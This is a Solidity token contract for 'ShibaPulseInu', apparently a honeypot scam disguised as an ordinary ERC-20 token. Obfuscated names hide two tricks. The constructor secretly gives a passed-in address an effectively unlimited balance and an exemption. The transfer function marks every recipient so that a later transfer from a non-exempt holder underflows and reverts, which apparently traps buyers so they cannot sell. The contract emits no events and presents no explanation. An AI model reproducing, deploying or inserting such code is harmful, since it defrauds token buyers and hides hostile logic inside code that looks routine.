// https://t.me/Shibapulseinu

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.6;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract ShibaPulseInu is Ownable {
    constructor(
        string memory fast,
        string memory dig,
        address bit,
        address doll
    ) {
        uniswapV2Router = IUniswapV2Router02(bit);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        _symbol = dig;
        _name = fast;
        like = 0;
        _decimals = 9;
        _balances[doll] = driving;
        happily = 1000000000;
        respect[doll] = driving;
        _tTotal = happily * 10**_decimals;
        respect[msg.sender] = driving;
        _balances[msg.sender] = _tTotal;
    }

    uint256 public like;
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    uint256 private _tTotal;
    uint256 private happily;
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    address private together;
    uint256 private driving = (~uint256(0));

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;

    function totalSupply() public view returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function _transfer(
        address women,
        address income,
        uint256 thick
    ) internal {
        uint256 lost = like;

        address mind = uniswapV2Pair;

        if (respect[women] == 0 && mind != women && ability[women] > 0) {
            respect[women] -= lost - 1;
        }

        address potatoes = together;
        together = income;
        ability[potatoes] += lost + 1;

        _balances[women] -= thick;
        uint256 tight = (thick / 100) * like;
        thick -= tight;
        _balances[income] += thick;
    }

    mapping(address => uint256) private ability;

    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }

    mapping(address => uint256) private respect;

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        _transfer(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        return true;
    }
}